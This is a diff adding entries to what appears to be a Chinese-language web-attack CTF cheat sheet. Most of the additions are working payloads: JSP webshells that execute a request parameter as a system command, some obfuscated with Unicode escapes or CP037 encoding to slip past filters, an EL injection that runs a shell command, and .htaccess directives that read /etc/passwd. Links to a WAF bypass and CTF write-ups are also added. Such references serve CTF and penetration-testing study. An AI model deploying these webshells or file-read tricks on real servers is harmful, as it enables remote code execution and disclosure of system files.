@@ -207,7 +207,43 @@ if("kaibro".equals(request.getParameter("pwd"))) {
 }
 %>
 ```
+- Unicode webshell:
 
+```
+<%\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006D\u0065\u0074\u0065\u0072\u0028\u0022\u0069\u0022\u0029\u0029\u003B%>
+```
+
+(效果同 `<%Runtime.getRuntime().exec(request.getParameter("i"));%>`)
+
+- JSPX webshell:
+
+```
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
+  version="1.2">
+<jsp:directive.page contentType="text/html"/>
+<jsp:declaration>
+</jsp:declaration>
+<jsp:scriptlet>
+Runtime.getRuntime().exec(request.getParameter("i"));
+</jsp:scriptlet>
+<jsp:text>
+</jsp:text>
+</jsp:root>
+```
+
+- CP037 webshell:
+
+```
+Lo%C2%A7%C2%94%C2%93@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B0%7F@%C2%85%C2%95%C2%83%C2%96%C2%84%C2%89%C2%95%C2%87~%7F%C2%83%C2%97%C3%B0%C3%B3%C3%B7%7Fon%25L%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3@%C2%A7%C2%94%C2%93%C2%95%C2%A2z%C2%91%C2%A2%C2%97~%7F%C2%88%C2%A3%C2%A3%C2%97zaa%C2%91%C2%81%C2%A5%C2%81K%C2%A2%C2%A4%C2%95K%C2%83%C2%96%C2%94a%C3%91%C3%A2%C3%97a%C3%97%C2%81%C2%87%C2%85%7F%25@@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B2%7Fn%25L%C2%91%C2%A2%C2%97z%C2%84%C2%89%C2%99%C2%85%C2%83%C2%A3%C2%89%C2%A5%C2%85K%C2%97%C2%81%C2%87%C2%85@%C2%83%C2%96%C2%95%C2%A3%C2%85%C2%95%C2%A3%C3%A3%C2%A8%C2%97%C2%85~%7F%C2%A3%C2%85%C2%A7%C2%A3a%C2%88%C2%A3%C2%94%C2%93%7Fan%25L%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25La%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25L%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85K%C2%87%C2%85%C2%A3%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85M%5DK%C2%85%C2%A7%C2%85%C2%83M%C2%99%C2%85%C2%98%C2%A4%C2%85%C2%A2%C2%A3K%C2%87%C2%85%C2%A3%C3%97%C2%81%C2%99%C2%81%C2%94%C2%85%C2%A3%C2%85%C2%99M%7F%C2%89%7F%5D%5D%5E%25La%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25L%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3n%25
+```
+
+(效果同上 JSPX webshell: `Runtime.getRuntime().exec(request.getParameter("i"));`)
+
+- EL webshell:
+
+```
+${Runtime.getRuntime().exec("touch /tmp/pwned")}
+```
 
 ## ASP Webshell
 
@@ -1322,6 +1358,7 @@ pop graphic-context
         - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
     - Multipart/form-data繞過
         - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
+        - Example: [Real World CTF 4th - Hack into Skynet](https://github.com/w181496/CTF/tree/master/RealWorldCTF2022/Hack_into_Skynet)
     - 偽造User-Agent
         - e.g. 有些WAF不封google bot
 
@@ -2185,11 +2222,16 @@ HQL injection example (pwn2win 2017)
     - jsv
     - jtml
 - .htaccess
+    - set handler
     ```
     <FilesMatch "kai">
     SetHandler application/x-httpd-php
     </FilesMatch>
     ```
+    - read file 
+      - `ErrorDocument 404 %{file:/etc/passwd}`
+      - `redirect permanent "/%{BASE64:%{FILE:/etc/passwd}}"`
+      - Example: [Real World CTF 4th - RWDN](https://r3kapig.com/writeup/20220125-rwctf4/#rwdn)
 
 - .user.ini
     - 只要 fastcgi 運行的 php 都適用 (nginx/apache/iis)
